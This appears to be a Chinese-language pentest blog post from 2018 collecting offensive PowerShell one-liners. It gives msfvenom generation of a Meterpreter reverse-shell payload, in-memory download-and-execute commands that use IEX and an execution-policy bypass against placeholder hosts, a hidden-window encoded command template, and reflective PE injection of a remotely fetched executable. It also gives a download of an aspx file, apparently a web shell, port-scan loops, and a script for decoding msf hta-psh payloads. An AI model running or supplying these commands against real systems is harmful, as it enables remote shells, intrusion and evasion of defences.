Title: Powershell
Date: 2018-6-13
slug: powershell-pen
Category: Pentest


```
反弹123端口的powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x. LPORT=123 -f psh-reflection >123.ps1
powershell.exe -exec Bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/123.ps1')"


端口扫描:
powershell -exec bypass -c "444..446 | % {echo ((new-object Net.Sockets.TcpClient).Connect('x.x.x.x',$_)) "Port $_ is open!"} 2>$null"

自定义端口和IP
1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.$a",$_)) "Port $_ is open!"} 2>$null}


1..20 | % { $a = $_; write-host "------"; write-host "192.168.1.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}
169..171 | % { $a = $_; write-host "------"; write-host "103.27.177.$a"; 445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}



powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx

内存加载运行:
powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://x.x.x.x/2.exe -ExeArgs 'whoami' -ForceASLR" 


下载文件:
(New-Object System.Net.Webclient).DownloadFile("http://x.x.x.x/k.aspx","")

```

* <http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/>


在使用msf声称ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:

```
python decode.py 1.txt

#/usr/bin/env python
# coding:utf-8

import base64
import gzip
import StringIO
import sys

f = sys.argv[1]
with open(f, "rb") as file:
    data = file.read()

decoded=base64.b64decode(data)
res = StringIO.StringIO(decoded)
for i in gzip.GzipFile(fileobj=res):
    print i
```